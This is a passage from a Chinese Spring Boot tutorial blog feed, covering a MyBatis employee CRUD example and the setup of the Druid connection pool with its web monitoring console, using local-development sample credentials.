接口</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//@Mapper : 表示本类是一个 MyBatis 的 Mapper</span><br><span class="hljs-meta">@Mapper</span><br><span class="hljs-meta">@Repositorypublic</span><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">EmployeeMapper</span> </span>&#123;<br>    <span class="hljs-comment">// 获取所有员工信息  </span><br>    <span class="hljs-function">List&lt;Employee&gt; <span class="hljs-title">getEmployees</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-comment">// 新增一个员工   </span><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">save</span><span class="hljs-params">(Employee employee)</span></span>;<br>    <span class="hljs-comment">// 通过id获得员工信息 </span><br>    <span class="hljs-function">Employee <span class="hljs-title">get</span><span class="hljs-params">(Integer id)</span></span>;<br>    <span class="hljs-comment">// 通过id删除员工 </span><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">delete</span><span class="hljs-params">(Integer id)</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>3、编写 EmployeeMapper.xml 配置文件</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">mapper</span>        <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span>        <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.kuang.mapper.EmployeeMapper&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;EmployeeMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;Employee&quot;</span>&gt;</span>       <br>        <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;eid&quot;</span>/&gt;</span>     <br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;lastName&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;last_name&quot;</span>/&gt;</span>   <br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;email&quot;</span>/&gt;</span>     <br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;gender&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;gender&quot;</span>/&gt;</span>    <br>        <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;birth&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;birth&quot;</span>/&gt;</span>       <br>        <span class="hljs-tag">&lt;<span class="hljs-name">association</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;eDepartment&quot;</span>  <span class="hljs-attr">javaType</span>=<span class="hljs-string">&quot;Department&quot;</span>&gt;</span>     <br>            <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;did&quot;</span>/&gt;</span>        <br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;departmentName&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;dname&quot;</span>/&gt;</span>      <br>        <span class="hljs-tag">&lt;/<span class="hljs-name">association</span>&gt;</span>   <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getEmployees&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;EmployeeMap&quot;</span>&gt;</span>   <br>        select e.id as eid,last_name,email,gender,birth,d.id as did,d.department_name as dname        <br>        from department d,employee e       <br>        where d.id = e.department  <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;save&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;Employee&quot;</span>&gt;</span>      <br>        insert into employee (last_name,email,gender,department,birth)   <br>        values (#&#123;lastName&#125;,#&#123;email&#125;,#&#123;gender&#125;,#&#123;department&#125;,#&#123;birth&#125;);  <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;get&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Employee&quot;</span>&gt;</span>      <br>        select * from employee where id = #&#123;id&#125;   <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;delete&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;int&quot;</span>&gt;</span>    <br>        delete from employee where id = #&#123;id&#125;   <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>4、编写EmployeeController类进行测试</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@RestControllerpublic</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EmployeeController</span> </span>&#123;<br>    <span class="hljs-meta">@Autowired</span>  <br>    EmployeeMapper employeeMapper;<br>    <span class="hljs-comment">// 获取所有员工信息 </span><br>    <span class="hljs-meta">@GetMapping(&quot;/getEmployees&quot;)</span>  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title">getEmployees</span><span class="hljs-params">()</span></span>&#123;  <br>        <span class="hljs-keyword">return</span> employeeMapper.getEmployees();  <br>    &#125;<br>    <span class="hljs-meta">@GetMapping(&quot;/save&quot;)</span>   <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">save</span><span class="hljs-params">()</span></span>&#123;       <br>        Employee employee = <span class="hljs-keyword">new</span> Employee();    <br>        employee.setLastName(<span class="hljs-string">&quot;kuangshen&quot;</span>);      <br>        employee.setEmail(<span class="hljs-string">&quot;qinjiang@qq.com&quot;</span>);    <br>        employee.setGender(<span class="hljs-number">1</span>);    <br>        employee.setDepartment(<span class="hljs-number">101</span>);    <br>        employee.setBirth(<span class="hljs-keyword">new</span> Date());       <br>        <span class="hljs-keyword">return</span> employeeMapper.save(employee);  <br>    &#125;<br>    <span class="hljs-comment">// 通过id获得员工信息  </span><br>    <span class="hljs-meta">@GetMapping(&quot;/get/&#123;id&#125;&quot;)</span>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Employee <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span></span>&#123;     <br>        <span class="hljs-keyword">return</span> employeeMapper.get(id);   <br>    &#125;<br>    <span class="hljs-comment">// 通过id删除员工  </span><br>    <span class="hljs-meta">@GetMapping(&quot;/delete/&#123;id&#125;&quot;)</span>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span></span>&#123;    <br>        <span class="hljs-keyword">return</span> employeeMapper.delete(id); <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>测试结果完成，搞定收工！</p>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Springboot</tag>
      
      <tag>MyBatis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>集成Druid</title>
    <link href="/2021/04/12/SpringBoot/%E9%9B%86%E6%88%90Druid/"/>
    <url>/2021/04/12/SpringBoot/%E9%9B%86%E6%88%90Druid/</url>
    
    <content type="html"><![CDATA[<h1 id="集成Druid"><a href="#集成Druid" class="headerlink" title="集成Druid"></a>集成Druid</h1><h2 id="Druid简介"><a href="#Druid简介" class="headerlink" title="Druid简介"></a>Druid简介</h2><p>Java程序很大一部分要操作数据库，为了提高性能操作数据库的时候，又不得不使用数据库连接池。</p><p>Druid 是阿里巴巴开源平台上一个数据库连接池实现，结合了 C3P0、DBCP 等 DB 池的优点，同时加入了日志监控。</p><p>Druid 可以很好的监控 DB 池连接和 SQL 的执行情况，天生就是针对监控而生的 DB 连接池。</p><p>Druid已经在阿里巴巴部署了超过600个应用，经过一年多生产环境大规模部署的严苛考验。</p><p>Spring Boot 2.0 以上默认使用 Hikari 数据源，可以说 Hikari 与 Driud 都是当前 Java Web 上最优秀的数据源，我们来重点介绍 Spring Boot 如何集成 Druid 数据源，如何实现数据库监控。</p><p>Github地址：<a href="https://github.com/alibaba/druid/">https://github.com/alibaba/druid/</a></p><p><strong>com.alibaba.druid.pool.DruidDataSource 基本配置参数如下：</strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7LYLicOHVGnwu7ibGvbwXibYeupdhDcaDPRLHgnULFbaJB5kPtC8n5QVLaUbbTRfa4ZyqficzZYrd2llA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7LYLicOHVGnwu7ibGvbwXibYeubiciawTdz0tg1EKDjZ1xaIgjRW9CZ4Apr4hvNz3iaQVQIKS3sXy629Lgg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7LYLicOHVGnwu7ibGvbwXibYeuaVD6mK3LJrtZ4B6fRKCLDgYicAVGzTUTzWdCNB5lF4tLpbcCT0uq1EA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="配置数据源"><a href="#配置数据源" class="headerlink" title="配置数据源"></a>配置数据源</h2><p>1、添加上 Druid 数据源依赖。</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/druid --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.21<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>2、切换数据源；之前已经说过 Spring Boot 2.0 以上默认使用 com.zaxxer.hikari.HikariDataSource 数据源，但可以 通过 spring.datasource.type 指定数据源。</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span> <br><span class="hljs-attr">datasource:</span>   <br>        <span class="hljs-attr">username:</span> <span class="hljs-string">root</span> <br>        <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>  <br>        <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/springboot?serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=utf-8</span>   <br>        <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>  <br>        <span class="hljs-attr">type:</span> <span class="hljs-string">com.alibaba.druid.pool.DruidDataSource</span> <span class="hljs-comment"># 自定义数据源</span><br></code></pre></div></td></tr></table></figure><p>3、数据源切换之后，在测试类中注入 DataSource，然后获取到它，输出一看便知是否成功切换；</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7LYLicOHVGnwu7ibGvbwXibYeuuxN8UrBxIAhgFpAvyQOgKyZLVbPXRhtvVO764zeJpXiaBFTX2e4cYVQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>4、切换成功！既然切换成功，就可以设置数据源连接初始化大小、最大连接数、等待时间、最小连接数 等设置项；可以查看源码</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span> <br><span class="hljs-attr">datasource:</span>    <br><span class="hljs-attr">username:</span> <span class="hljs-string">root</span>  <br><span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>  <br><span class="hljs-comment">#?serverTimezone=UTC解决时区的报错  </span><br><span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/springboot?serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=utf-8</span>   <br><span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>  <br><span class="hljs-attr">type:</span> <span class="hljs-string">com.alibaba.druid.pool.DruidDataSource</span><br>    <span class="hljs-comment">#Spring Boot 默认是不注入这些属性值的，需要自己绑定    </span><br>    <span class="hljs-comment">#druid 数据源专有配置  </span><br><span class="hljs-attr">initialSize:</span> <span class="hljs-number">5</span>  <br><span class="hljs-attr">minIdle:</span> <span class="hljs-number">5</span>   <br><span class="hljs-attr">maxActive:</span> <span class="hljs-number">20</span>  <br><span class="hljs-attr">maxWait:</span> <span class="hljs-number">60000</span> <br><span class="hljs-attr">timeBetweenEvictionRunsMillis:</span> <span class="hljs-number">60000</span>  <br><span class="hljs-attr">minEvictableIdleTimeMillis:</span> <span class="hljs-number">300000</span> <br><span class="hljs-attr">validationQuery:</span> <span class="hljs-string">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-string">FROM</span> <span class="hljs-string">DUAL</span>  <br><span class="hljs-attr">testWhileIdle:</span> <span class="hljs-literal">true</span>  <br><span class="hljs-attr">testOnBorrow:</span> <span class="hljs-literal">false</span>   <br><span class="hljs-attr">testOnReturn:</span> <span class="hljs-literal">false</span>  <br><span class="hljs-attr">poolPreparedStatements:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-comment">#配置监控统计拦截的filters，stat:监控统计、log4j：日志记录、wall：防御sql注入    </span><br>    <span class="hljs-comment">#如果允许时报错  java.lang.ClassNotFoundException: org.apache.log4j.Priority   </span><br>    <span class="hljs-comment">#则导入 log4j 依赖即可，Maven 地址：https://mvnrepository.com/artifact/log4j/log4j    </span><br><span class="hljs-attr">filters:</span> <span class="hljs-string">stat,wall,log4j</span> <br><span class="hljs-attr">maxPoolPreparedStatementPerConnectionSize:</span> <span class="hljs-number">20</span><br><span class="hljs-attr">useGlobalDataSourceStat:</span> <span class="hljs-literal">true</span>   <br><span class="hljs-attr">connectionProperties:</span> <span class="hljs-string">druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500</span><br></code></pre></div></td></tr></table></figure><p>5、导入Log4j 的依赖</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/log4j/log4j --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>6、现在需要程序员自己为 DruidDataSource 绑定全局配置文件中的参数，再添加到容器中，而不再使用 Spring Boot 的自动生成了；我们需要 自己添加 DruidDataSource 组件到容器中，并绑定属性；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.config;<br><span class="hljs-keyword">import</span> com.alibaba.druid.pool.DruidDataSource;<br><span class="hljs-keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> javax.sql.DataSource;<br><span class="hljs-meta">@Configurationpublic</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DruidConfig</span> </span>&#123;<br>    <br>    <span class="hljs-comment">/*   </span><br><span class="hljs-comment">    将自定义的 Druid数据源添加到容器中，不再让 Spring Boot 自动创建   </span><br><span class="hljs-comment">    绑定全局配置文件中的 druid 数据源属性到 com.alibaba.druid.pool.DruidDataSource从而让它们生效  </span><br><span class="hljs-comment">    @ConfigurationProperties(prefix = &quot;spring.datasource&quot;)：作用就是将 全局配置文件中     </span><br><span class="hljs-comment">    前缀为 spring.datasource的属性值注入到 com.alibaba.druid.pool.DruidDataSource 的同名参数中  </span><br><span class="hljs-comment">    */</span>    <br>    <span class="hljs-meta">@ConfigurationProperties(prefix = &quot;spring.datasource&quot;)</span>   <br>    <span class="hljs-meta">@Bean</span>   <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> DataSource <span class="hljs-title">druidDataSource</span><span class="hljs-params">()</span> </span>&#123;      <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> DruidDataSource();  <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>7、去测试类中测试一下；看是否成功！</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootTestclass</span> <br>SpringbootDataJdbcApplicationTests &#123;<br>    <span class="hljs-comment">//DI注入数据源    </span><br>    <span class="hljs-meta">@Autowired</span>   <br>    DataSource dataSource;<br>    <span class="hljs-meta">@Test</span> <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">contextLoads</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;  <br>        <span class="hljs-comment">//看一下默认数据源   </span><br>        System.out.println(dataSource.getClass());       <br>        <span class="hljs-comment">//获得连接   </span><br>        Connection connection =   dataSource.getConnection();     <br>        System.out.println(connection);<br>        DruidDataSource druidDataSource = (DruidDataSource) dataSource;     <br>        System.out.println(<span class="hljs-string">&quot;druidDataSource 数据源最大连接数：&quot;</span> + druidDataSource.getMaxActive());      <br>        System.out.println(<span class="hljs-string">&quot;druidDataSource 数据源初始化连接数：&quot;</span> + druidDataSource.getInitialSize());<br>        <span class="hljs-comment">//关闭连接      </span><br>        connection.close();  <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>输出结果 ：可见配置参数已经生效！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7LYLicOHVGnwu7ibGvbwXibYeu14qkV9vFaME5ficcLe7MqPFgOH4iaEicia05eNNkSvhoVhWodykDXMtUcQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="配置Druid数据源监控"><a href="#配置Druid数据源监控" class="headerlink" title="配置Druid数据源监控"></a>配置Druid数据源监控</h2><p>Druid 数据源具有监控的功能，并提供了一个 web 界面方便用户查看，类似安装 路由器 时，人家也提供了一个默认的 web 页面。</p><p>所以第一步需要设置 Druid 的后台管理页面，比如 登录账号、密码 等；配置后台管理；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//配置 Druid 监控管理后台的Servlet；</span><br><span class="hljs-comment">//内置 Servlet 容器时没有web.xml文件，所以使用 Spring Boot 的注册 Servlet 方式</span><br><span class="hljs-meta">@Beanpublic</span> <span class="hljs-function">ServletRegistrationBean <span class="hljs-title">statViewServlet</span><span class="hljs-params">()</span> </span>&#123;    <br>    ServletRegistrationBean bean = <span class="hljs-keyword">new</span> ServletRegistrationBean(<span class="hljs-keyword">new</span> StatViewServlet(), <span class="hljs-string">&quot;/druid/*&quot;</span>);<br>    <span class="hljs-comment">// 这些参数可以在 com.alibaba.druid.support.http.StatViewServlet  </span><br>    <span class="hljs-comment">// 的父类 com.alibaba.druid.support.http.ResourceServlet 中找到   </span><br>    Map&lt;String, String&gt; initParams = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();    <br>    initParams.put(<span class="hljs-string">&quot;loginUsername&quot;</span>, <span class="hljs-string">&quot;admin&quot;</span>);<br>    <span class="hljs-comment">//后台管理界面的登录账号   </span><br>    initParams.put(<span class="hljs-string">&quot;loginPassword&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>); <br>    <span class="hljs-comment">//后台管理界面的登录密码</span><br>    <span class="hljs-comment">//后台允许谁可以访问  </span><br>    <span class="hljs-comment">//initParams.put(&quot;allow&quot;, &quot;localhost&quot;)：表示只有本机可以访问   </span><br>    <span class="hljs-comment">//initParams.put(&quot;allow&quot;, &quot;&quot;)：为空或者为null时，表示允许所有访问 </span><br>    initParams.put(<span class="hljs-string">&quot;allow&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);   <br>    <span class="hljs-comment">//deny：Druid 后台拒绝谁访问 </span><br>    <span class="hljs-comment">//initParams.put(&quot;kuangshen&quot;, &quot;192.168.1.20&quot;);表示禁止此ip访问</span><br>    <span class="hljs-comment">//设置初始化参数  </span><br>    bean.setInitParameters(initParams);    <br>    <span class="hljs-keyword">return</span> bean;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>配置完毕后，我们可以选择访问 ：<a href="http://localhost:8080/druid/login.html">http://localhost:8080/druid/login.html</a></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7LYLicOHVGnwu7ibGvbwXibYeu5TbyjT1Hib2vCDW9988ibXicDcXEnvooGfvNbchJrZ7TUwe3wJm0ktooA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>进入之后</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7LYLicOHVGnwu7ibGvbwXibYeuaibKTBtqpoSiaZib9WTRdZaZhIYBRLB8Em7a5aLGw88uKjR8UCian11yCg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>配置 Druid web 监控 filter 过滤器</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//配置 Druid 监控 之  web 监控的 filter</span><br><span class="hljs-comment">//WebStatFilter：用于配置Web和Druid数据源之间的管理关联监控统计</span><br><span class="hljs-meta">@Beanpublic</span><br><span class="hljs-function">FilterRegistrationBean <span class="hljs-title">webStatFilter</span><span class="hljs-params">()</span> </span>&#123;    <br>    FilterRegistrationBean bean = <span class="hljs-keyword">new</span> FilterRegistrationBean();  <br>    bean.setFilter(<span class="hljs-keyword">new</span> WebStatFilter());<br>    <span class="hljs-comment">//exclusions：设置哪些请求进行过滤排除掉，从而不进行统计  </span><br>    Map&lt;String, String&gt; initParams = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();    <br>    initParams.put(<span class="hljs-string">&quot;exclusions&quot;</span>, <span 